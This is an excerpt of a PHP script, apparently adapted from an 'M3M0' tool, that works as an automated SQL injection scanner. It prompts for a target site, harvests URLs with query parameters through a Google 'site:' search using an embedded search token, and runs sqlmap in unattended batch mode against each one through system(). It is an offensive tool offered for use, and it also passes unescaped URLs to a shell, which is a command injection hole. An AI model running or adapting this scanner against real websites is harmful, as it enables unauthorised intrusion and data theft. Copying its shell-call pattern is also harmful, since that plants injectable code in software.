...
* script taken from a part of M3M0 tool
* edited by mori - modified as a SQLi scanner
**/
define('CSE_TOKEN', 'partner-pub-2698861478625135:3033704849');
    ...
    banner();
    echo "# target website(ex:twitch.tv): "; $dork = "site:" . fgets(STDIN);
    $i = 0;
    while(true){
        $headers = array();
        ...
        if($trackUrl[1] != NULL){
            foreach($trackUrl[1] as $index => $key){
                $decode_url = urldecode(get_string($key, '&q=', '&sa'))."\n";
		if (strpos($decode_url, "=") !== false) {

                	echo "trying sql injection against: " . $decode_url;
                	system("sqlmap -o --os Linux --smart --batch -u " . $decode_url);
			echo $decode_url;
		}
		else { 
			echo "skipping " . $decode_url . " ...";
		}
            }
        }else{
            echo "{!} DONE!\n";
